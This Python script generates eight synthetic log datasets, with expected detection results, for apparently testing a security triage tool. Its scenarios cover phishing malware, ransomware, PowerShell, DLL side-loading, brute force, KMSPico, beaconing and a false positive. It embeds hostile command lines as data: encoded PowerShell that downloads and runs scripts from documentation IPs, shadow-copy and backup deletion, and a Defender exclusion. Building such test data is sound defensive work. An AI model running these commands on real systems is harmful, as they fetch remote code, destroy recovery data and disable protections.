"""Génère les 8 jeux de données SYNTHÉTIQUES de test et leurs résultats attendus.

Aucun malware réel : les « charges » sont des chaînes de texte inertes, les hashs sont fictifs (dérivés de
chaînes descriptives) et les adresses IP appartiennent aux plages de documentation RFC 5737.
Usage : python scripts/generate_scenarios.py
"""
from __future__ import annotations

import base64
import csv
import hashlib
import json
from datetime import datetime, timedelta
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / "tests" / "data" / "scenarios"


def fake_hash(label: str) -> str:
    return hashlib.sha256(f"SYNTHETIC-TEST-{label}".encode()).hexdigest()


def ts(base: datetime, sec: float) -> str:
    return (base + timedelta(seconds=sec)).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def write(name: str, files: dict[str, str | bytes], expected: dict) -> None:
    d = OUT / name
    d.mkdir(parents=True, exist_ok=True)
    for fname, content in files.items():
        (d / fname).write_bytes(content if isinstance(content, bytes) else content.encode("utf-8"))
    (d / "expected.json").write_text(json.dumps(expected, ensure_ascii=False, indent=2), encoding="utf-8")


def enc(ps: str) -> str:
    return base64.b64encode(ps.encode("utf-16-le")).decode()


# ------------------------------------------------------------------ 1. infection malware (Defender XDR + e-mail)
def s1_malware():
    b = datetime(2026, 3, 2, 8, 15, 0)
    dropper = fake_hash("invoice-dropper")
    rows = [
        {"Timestamp": ts(b, 0), "DeviceName": "WS-FIN-012", "ActionType": "ProcessCreated", "FileName": "WINWORD.EXE",
         "FolderPath": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
         "ProcessCommandLine": "\"WINWORD.EXE\" /n \"C:\\Users\\mdupont\\Downloads\\Facture_2026-118.docm\"",
         "InitiatingProcessFileName": "explorer.exe", "ProcessId": 5120, "InitiatingProcessId": 3010,
         "AccountName": "mdupont", "SHA256": fake_hash("winword")},
        {"Timestamp": ts(b, 151), "DeviceName": "WS-FIN-012", "ActionType": "ProcessCreated", "FileName": "powershell.exe",
         "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "ProcessCommandLine": "powershell.exe -nop -w hidden -enc " + enc(
             "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.24/update.ps1')"),
         "InitiatingProcessFileName": "WINWORD.EXE", "ProcessId": 6400, "InitiatingProcessId": 5120,
         "InitiatingProcessCommandLine": "\"WINWORD.EXE\" /n \"C:\\Users\\mdupont\\Downloads\\Facture_2026-118.docm\"",
         "AccountName": "mdupont", "SHA256": fake_hash("powershell")},
        {"Timestamp": ts(b, 165), "DeviceName": "WS-FIN-012", "ActionType": "ConnectionSuccess", "RemoteIP": "198.51.100.24",
         "RemotePort": 80, "RemoteUrl": "http://198.51.100.24/update.ps1", "InitiatingProcessFileName": "powershell.exe",
         "InitiatingProcessId": 6400, "ProcessId": 6400, "FileName": "powershell.exe", "AccountName": "mdupont"},
        {"Timestamp": ts(b, 182), "DeviceName": "WS-FIN-012", "ActionType": "FileCreated", "FileName": "svcupdate.exe",
         "FolderPath": "C:\\Users\\mdupont\\AppData\\Roaming\\svcupdate.exe", "SHA256": dropper,
         "InitiatingProcessFileName": "powershell.exe", "InitiatingProcessId": 6400, "AccountName": "mdupont"},
        {"Timestamp": ts(b, 254), "DeviceName": "WS-FIN-012", "ActionType": "ProcessCreated", "FileName": "svcupdate.exe",
         "FolderPath": "C:\\Users\\mdupont\\AppData\\Roaming\\svcupdate.exe", "ProcessCommandLine": "svcupdate.exe /silent",
         "InitiatingProcessFileName": "powershell.exe", "ProcessId": 7012, "InitiatingProcessId": 6400,
         "AccountName": "mdupont", "SHA256": dropper, "Signed": "false"},
        {"Timestamp": ts(b, 330), "DeviceName": "WS-FIN-012", "ActionType": "RegistryValueSet",
         "RegistryKey": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SvcUpdate",
         "RegistryValueData": "C:\\Users\\mdupont\\AppData\\Roaming\\svcupdate.exe /silent",
         "InitiatingProcessFileName": "svcupdate.exe", "InitiatingProcessId": 7012, "ProcessId": 7012, "FileName": "svcupdate.exe",
         "AccountName": "mdupont"},
    ]
    for i in range(8):
        rows.append({"Timestamp": ts(b, 400 + 60 * i), "DeviceName": "WS-FIN-012", "ActionType": "ConnectionSuccess",
                     "RemoteIP": "203.0.113.45", "RemotePort": 443, "InitiatingProcessFileName": "svcupdate.exe",
                     "InitiatingProcessId": 7012, "ProcessId": 7012, "FileName": "svcupdate.exe", "AccountName": "mdupont"})
    eml = ("Return-Path: <billing@facturation-fournisseur.example>\r\n"
           "Received: from mail.facturation-fournisseur.example ([198.51.100.88]) by mx.corp.example\r\n"
           "Authentication-Results: mx.corp.example; spf=fail smtp.mailfrom=facturation-fournisseur.example; dkim=none; dmarc=fail\r\n"
           "From: Service Facturation <billing@facturation-fournisseur.example>\r\n"
           "Reply-To: recouvrement@paiement-rapide.example\r\nTo: mdupont@corp.example\r\n"
           "Subject: URGENT - Facture impayee n.2026-118\r\nDate: Mon, 02 Mar 2026 07:58:11 +0000\r\n"
           "Message-ID: <synthetic-0001@facturation-fournisseur.example>\r\nMIME-Version: 1.0\r\n"
           "Content-Type: multipart/mixed; boundary=\"B\"\r\n\r\n--B\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n"
           "Bonjour, veuillez regler la facture ci-jointe avant ce soir. Activez le contenu pour afficher le montant.\r\n"
           "--B\r\nContent-Type: application/vnd.ms-word.document.macroEnabled.12\r\n"
           "Content-Disposition: attachment; filename=\"Facture_2026-118.docm\"\r\nContent-Transfer-Encoding: base64\r\n\r\n"
           + base64.b64encode(b"SYNTHETIC TEST ATTACHMENT - NOT A REAL DOCUMENT").decode() + "\r\n--B--\r\n")
    write("01_malware_infection", {"defender_advanced_hunting.json": json.dumps({"Results": rows}, indent=1),
                                   "phishing_email.eml": eml}, {
        "description": "Pièce jointe Word piégée → PowerShell encodé → téléchargement → exécutable dans AppData → "
                       "clé Run → beaconing HTTPS.",
        "verdict_in": ["Confirmed", "Likely"], "severity_in": ["High", "Critical"],
        "mitre_must_include": ["T1059.001", "T1204.002", "T1566.001", "T1547.001", "T1105"],
        "rules_must_include": ["R-OFF-001", "R-PS-001", "R-PER-001", "R-MAIL-001", "R-NET-002"],
        "iocs_must_include": [dropper, "198.51.100.24", "203.0.113.45"],
        "sources_must_include": ["Microsoft Defender XDR"],
    })


# ------------------------------------------------------------------ 2. ransomware (Sysmon, export XML)
def s2_ransomware():
    b = datetime(2026, 3, 3, 1, 12, 0)
    events = []

    def ev(eid: int, sec: float, data: dict) -> None:
        d = "".join(f'<Data Name="{k}">{v}</Data>' for k, v in data.items())
        events.append(f'<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
                      f'<Provider Name="Microsoft-Windows-Sysmon"/><EventID>{eid}</EventID>'
                      f'<TimeCreated SystemTime="{ts(b, sec)}"/><Computer>SRV-FILES-01</Computer>'
                      f'<Channel>Microsoft-Windows-Sysmon/Operational</Channel></System><EventData>{d}</EventData></Event>')

    enc_proc = "C:\\ProgramData\\sync\\wcrypt.exe"
    ev(1, 0, {"UtcTime": ts(b, 0), "ProcessId": 900, "Image": enc_proc, "CommandLine": f"{enc_proc} --all",
              "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": 880, "User": "CORP\\svc_backup",
              "Hashes": f"SHA256={fake_hash('ransom-encryptor').upper()}"})
    ev(1, 5, {"UtcTime": ts(b, 5), "ProcessId": 910, "Image": "C:\\Windows\\System32\\vssadmin.exe",
              "CommandLine": "vssadmin.exe delete shadows /all /quiet", "ParentImage": enc_proc, "ParentProcessId": 900,
              "User": "CORP\\svc_backup"})
    ev(1, 8, {"UtcTime": ts(b, 8), "ProcessId": 920, "Image": "C:\\Windows\\System32\\wbadmin.exe",
              "CommandLine": "wbadmin delete catalog -quiet", "ParentImage": enc_proc, "ParentProcessId": 900,
              "User": "CORP\\svc_backup"})
    ev(1, 10, {"UtcTime": ts(b, 10), "ProcessId": 930, "Image": "C:\\Windows\\System32\\bcdedit.exe",
               "CommandLine": "bcdedit /set {default} recoveryenabled No", "ParentImage": enc_proc, "ParentProcessId": 900,
               "User": "CORP\\svc_backup"})
    for i in range(45):
        ev(11, 20 + i, {"UtcTime": ts(b, 20 + i), "ProcessId": 900, "Image": enc_proc,
                        "TargetFilename": f"D:\\Partages\\Compta\\dossier{i % 5}\\document_{i:03d}.xlsx.lockdsim"})
    ev(11, 70, {"UtcTime": ts(b, 70), "ProcessId": 900, "Image": enc_proc,
                "TargetFilename": "D:\\Partages\\Compta\\README_RESTORE_FILES.txt"})
    xml = "<Events>\n" + "\n".join(events) + "\n</Events>\n"
    write("02_ransomware", {"sysmon_export.xml": xml}, {
        "description": "Suppression des clichés instantanés et sauvegardes puis chiffrement massif (.lockdsim) et note de rançon.",
        "verdict_in": ["Confirmed"], "severity_in": ["Critical"], "mitre_must_include": ["T1490", "T1486"],
        "rules_must_include": ["R-RAN-001", "R-RAN-003"], "incident_type_contains": "Ransomware",
        "sources_must_include": ["Sysmon"],
    })


# ------------------------------------------------------------------ 3. PowerShell suspect (export Splunk CSV)
def s3_powershell():
    b = datetime(2026, 3, 4, 14, 2, 0)
    payload = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/stage2.ps1')"
    rows = [
        {"_time": ts(b, 0), "host": "WS-RH-004", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
         "EventCode": "1", "Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c start /min run.bat",
         "ParentImage": "C:\\Windows\\explorer.exe", "ProcessId": "3001", "ParentProcessId": "1200", "User": "CORP\\lmartin",
         "_raw": "synthetic"},
        {"_time": ts(b, 3), "host": "WS-RH-004", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
         "EventCode": "1", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "CommandLine": f"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {enc(payload)}",
         "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ProcessId": "3044", "ParentProcessId": "3001",
         "User": "CORP\\lmartin", "_raw": "synthetic"},
    ]
    buf = []
    w_fields = list(rows[0].keys())
    import io

    s = io.StringIO()
    w = csv.DictWriter(s, fieldnames=w_fields)
    w.writeheader()
    w.writerows(rows)
    buf.append(s.getvalue())
    write("03_powershell_suspicious", {"splunk_export.csv": buf[0]}, {
        "description": "PowerShell lancé caché avec contournement de politique et commande encodée de téléchargement.",
        "verdict_in": ["Likely", "Confirmed"], "severity_in": ["High", "Critical"],
        "mitre_must_include": ["T1059.001", "T1027.010", "T1105"], "rules_must_include": ["R-PS-001"],
        "decoded_must_contain": "DownloadString", "iocs_must_include": ["http://203.0.113.50/stage2.ps1", "203.0.113.50"],
        "sources_must_include": ["Splunk"],
    })


# ------------------------------------------------------------------ 4. DLL side-loading (Elastic ECS NDJSON)
def s4_dll():
    b = datetime(2026, 3, 5, 9, 40, 0)
    host, exe, dll = "WS-DEV-031", "C:\\Users\\Public\\Libraries\\OneUpdate\\SecurityHealthHost.exe", \
        "C:\\Users\\Public\\Libraries\\OneUpdate\\version.dll"
    docs = [
        {"@timestamp": ts(b, 0), "event": {"action": "start", "category": "process"}, "host": {"name": host},
         "user": {"name": "pnguyen"}, "agent": {"type": "endpoint"},
         "process": {"name": "SecurityHealthHost.exe", "executable": exe, "pid": 4100, "command_line": f"\"{exe}\"",
                     "hash": {"sha256": fake_hash("signed-host-binary")}, "code_signature": {"exists": True,
                     "subject_name": "Legit Vendor Ltd"}, "parent": {"name": "explorer.exe", "pid": 2200}}},
        {"@timestamp": ts(b, 1), "event": {"action": "load", "category": "library"}, "host": {"name": host},
         "user": {"name": "pnguyen"}, "process": {"name": "SecurityHealthHost.exe", "executable": exe, "pid": 4100,
                                                  "code_signature": {"exists": True}},
         "dll": {"path": dll, "code_signature": {"exists": False}, "hash": {"sha256": fake_hash("sideloaded-dll")}}},
        {"@timestamp": ts(b, 30), "event": {"action": "modification", "category": "registry"}, "host": {"name": host},
         "process": {"name": "SecurityHealthHost.exe", "pid": 4100, "executable": exe},
         "registry": {"path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneUpdate",
                      "data": {"strings": [exe]}}},
    ]
    for i in range(8):
        docs.append({"@timestamp": ts(b, 60 + 120 * i), "event": {"action": "connection_attempted", "category": "network"},
                     "host": {"name": host}, "process": {"name": "SecurityHealthHost.exe", "pid": 4100, "executable": exe},
                     "destination": {"ip": "203.0.113.200", "port": 443}, "source": {"ip": "10.20.30.31", "port": 50000 + i}})
    write("04_dll_sideloading", {"elastic_endpoint.ndjson": "\n".join(json.dumps(d) for d in docs) + "\n"}, {
        "description": "Binaire signé copié dans C:\\Users\\Public chargeant une version.dll non signée, puis persistance et beaconing.",
        "verdict_in": ["Confirmed"], "severity_in": ["High", "Critical"], "mitre_must_include": ["T1574.001", "T1547.001"],
        "rules_must_include": ["R-DLL-001", "R-NET-002"], "iocs_must_include": ["203.0.113.200", dll],
        "sources_must_include": ["Elastic Security"],
    })


# ------------------------------------------------------------------ 5. brute force (Linux auth.log)
def s5_bruteforce():
    b = datetime(2026, 3, 6, 3, 0, 0)
    lines = []
    for i in range(36):
        t = (b + timedelta(seconds=7 * i)).strftime("%b %d %H:%M:%S").replace(" 0", "  ", 1)
        user = "admin" if i % 3 else "root"
        lines.append(f"{t} srv-web-02 sshd[{2000 + i}]: Failed password for {user} from 198.51.100.66 port {40000 + i} ssh2")
    t = (b + timedelta(seconds=7 * 36 + 20)).strftime("%b %d %H:%M:%S").replace(" 0", "  ", 1)
    lines.append(f"{t} srv-web-02 sshd[2100]: Accepted password for admin from 198.51.100.66 port 40100 ssh2")
    t = (b + timedelta(seconds=7 * 36 + 80)).strftime("%b %d %H:%M:%S").replace(" 0", "  ", 1)
    lines.append(f"{t} srv-web-02 sudo:    admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/id")
    write("05_brute_force", {"auth.log": "\n".join(lines) + "\n"}, {
        "description": "36 échecs SSH depuis une même IP sur deux comptes puis connexion réussie au compte admin.",
        "verdict_in": ["Likely", "Confirmed"], "severity_in": ["High", "Medium"], "mitre_must_include": ["T1110.001", "T1078"],
        "rules_must_include": ["R-AUTH-001"], "iocs_must_include": ["198.51.100.66"], "sources_must_include": ["Linux Syslog"],
    })


# ------------------------------------------------------------------ 6. KMSPico (événements Windows XML)
def s6_kms():
    b = datetime(2026, 3, 7, 11, 5, 0)
    events = []

    def ev(eid: int, sec: float, provider: str, data: dict) -> None:
        d = "".join(f'<Data Name="{k}">{v}</Data>' for k, v in data.items())
        events.append(f'<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
                      f'<Provider Name="{provider}"/><EventID>{eid}</EventID><TimeCreated SystemTime="{ts(b, sec)}"/>'
                      f'<Computer>WS-ACCUEIL-07</Computer><Channel>Security</Channel></System><EventData>{d}</EventData></Event>')

    sec = "Microsoft-Windows-Security-Auditing"
    ev(4688, 0, sec, {"SubjectUserName": "accueil", "SubjectDomainName": "CORP", "NewProcessId": "0x1a2c",
                      "NewProcessName": "C:\\Users\\accueil\\Downloads\\KMSpico_setup.exe", "ProcessId": "0x0f10",
                      "ParentProcessName": "C:\\Windows\\explorer.exe", "CommandLine": "\"KMSpico_setup.exe\""})
    ev(4688, 40, sec, {"SubjectUserName": "accueil", "SubjectDomainName": "CORP", "NewProcessId": "0x1b00",
                       "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessId": "0x1a2c",
                       "ParentProcessName": "C:\\Users\\accueil\\Downloads\\KMSpico_setup.exe",
                       "CommandLine": "powershell.exe -Command Add-MpPreference -ExclusionPath 'C:\\Program Files\\KMSpico'"})
    ev(7045, 60, "Service Control Manager", {"ServiceName": "Service KMSELDI",
                                             "ImagePath": "C:\\Program Files\\KMSpico\\Service_KMS.exe", "ServiceType": "user mode service",
                                             "StartType": "auto start", "AccountName": "LocalSystem"})
    ev(4698, 65, sec, {"SubjectUserName": "accueil", "SubjectDomainName": "CORP", "TaskName": "\\AutoPico Daily Restart",
                       "TaskContent": "C:\\Program Files\\KMSpico\\AutoPico.exe /silent"})
    ev(4688, 90, sec, {"SubjectUserName": "SYSTEM", "SubjectDomainName": "NT AUTHORITY", "NewProcessId": "0x1c10",
                       "NewProcessName": "C:\\Program Files\\KMSpico\\AutoPico.exe", "ProcessId": "0x0300",
                       "ParentProcessName": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "AutoPico.exe /silent"})
    xml = '<?xml version="1.0" encoding="utf-8"?>\n<Events>\n' + "\n".join(events) + "\n</Events>\n"
    write("06_kmspico", {"windows_security_export.xml": xml}, {
        "description": "Installation de KMSpico : exclusion Defender, service KMSELDI, tâche AutoPico.",
        "verdict_in": ["Confirmed"], "severity_in": ["Medium", "High"], "mitre_must_include": ["T1685", "T1543.003", "T1053.005"],
        "rules_must_include": ["R-PUA-001", "R-DEF-001", "R-PER-003", "R-PER-002"],
        "incident_type_contains": "KMS", "sources_must_include": ["Windows"],
    })


# ------------------------------------------------------------------ 7. connexion réseau suspecte (pare-feu + DNS)
def s7_network():
    b = datetime(2026, 3, 8, 10, 0, 0)
    fw = []
    for i in range(10):
        t = b + timedelta(seconds=300 * i)
        fw.append(f"date={t:%Y-%m-%d} time={t:%H:%M:%S} devname=FW-EDGE-01 type=traffic subtype=forward action=accept "
                  f"srcip=10.10.5.44 srcport={51000 + i} dstip=203.0.113.77 dstport=8443 proto=6 service=tcp/8443 "
                  f"sentbyte={512 + i % 3} rcvdbyte=1024")
    fw.append(f"date={b:%Y-%m-%d} time={b + timedelta(seconds=30):%H:%M:%S} devname=FW-EDGE-01 type=traffic "
              f"action=accept srcip=10.10.5.20 srcport=50111 dstip=10.10.1.5 dstport=53 proto=17 service=dns")
    import random

    rnd = random.Random(7)
    dns = []
    for i in range(14):
        label = "".join(rnd.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(16))
        dns.append({"UtcTime": ts(b, 20 * i), "EventID": 22, "Provider": "Microsoft-Windows-Sysmon", "Computer": "WS-MKT-044",
                    "Image": "C:\\Users\\cbernard\\AppData\\Local\\Temp\\upd.exe", "ProcessId": 5555,
                    "QueryName": f"{label}.info", "QueryStatus": "9003", "QueryResults": ""})
    write("07_suspicious_network", {"firewall.log": "\n".join(fw) + "\n", "sysmon_dns.json": json.dumps(dns, indent=1)}, {
        "description": "Communications périodiques (300 s) vers 203.0.113.77:8443 et résolutions DNS pseudo-aléatoires en échec.",
        "verdict_in": ["Likely", "Suspicious"], "severity_in": ["High", "Medium"], "mitre_must_include": ["T1071.001", "T1568.002"],
        "rules_must_include": ["R-NET-002", "R-DNS-001"], "iocs_must_include": ["203.0.113.77"],
        "sources_must_include": ["Firewall Logs", "Sysmon"],
    })


# ------------------------------------------------------------------ 8. faux positif (déploiement SCCM légitime)
def s8_false_positive():
    b = datetime(2026, 3, 9, 13, 0, 0)
    rows = [
        {"Timestamp": ts(b, 0), "DeviceName": "WS-COMPTA-003", "ActionType": "ProcessCreated", "FileName": "powershell.exe",
         "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "ProcessCommandLine": "powershell.exe -NoProfile -ExecutionPolicy Bypass -File "
                               "\"C:\\Windows\\CCM\\SystemTemp\\Install-AcrobatUpdate.ps1\"",
         "InitiatingProcessFileName": "CcmExec.exe", "InitiatingProcessFolderPath": "C:\\Windows\\CCM",
         "ProcessId": 4410, "InitiatingProcessId": 2100, "AccountName": "system", "SHA256": fake_hash("powershell-legit")},
        {"Timestamp": ts(b, 20), "DeviceName": "WS-COMPTA-003", "ActionType": "ProcessCreated", "FileName": "schtasks.exe",
         "FolderPath": "C:\\Windows\\System32\\schtasks.exe",
         "ProcessCommandLine": "schtasks.exe /create /tn \"Adobe Acrobat Update Task\" /tr "
                               "\"C:\\Program Files (x86)\\Common Files\\Adobe\\ARM\\1.0\\AdobeARM.exe\" /sc daily /st 12:00 /f",
         "InitiatingProcessFileName": "CcmExec.exe", "ProcessId": 4500, "InitiatingProcessId": 2100, "AccountName": "system"},
        {"Timestamp": ts(b, 40), "DeviceName": "WS-COMPTA-003", "ActionType": "ConnectionSuccess", "RemoteIP": "10.0.0.25",
         "RemotePort": 443, "InitiatingProcessFileName": "powershell.exe", "InitiatingProcessId": 4410, "ProcessId": 4410,
         "FileName": "powershell.exe", "AccountName": "system"},
    ]
    write("08_false_positive", {"defender_sccm_deployment.json": json.dumps(rows, indent=1)}, {
        "description": "Déploiement logiciel SCCM légitime : PowerShell -ExecutionPolicy Bypass et tâche planifiée lancés par CcmExec.",
        "verdict_in": ["False Positive"], "severity_in": ["Informational"], "mitre_must_include": [],
        "rules_must_include": ["R-PS-001", "R-PER-002"], "sources_must_include": ["Microsoft Defender XDR"],
    })


if __name__ == "__main__":
    for fn in (s1_malware, s2_ransomware, s3_powershell, s4_dll, s5_bruteforce, s6_kms, s7_network, s8_false_positive):
        fn()
    print("Scénarios générés dans", OUT)
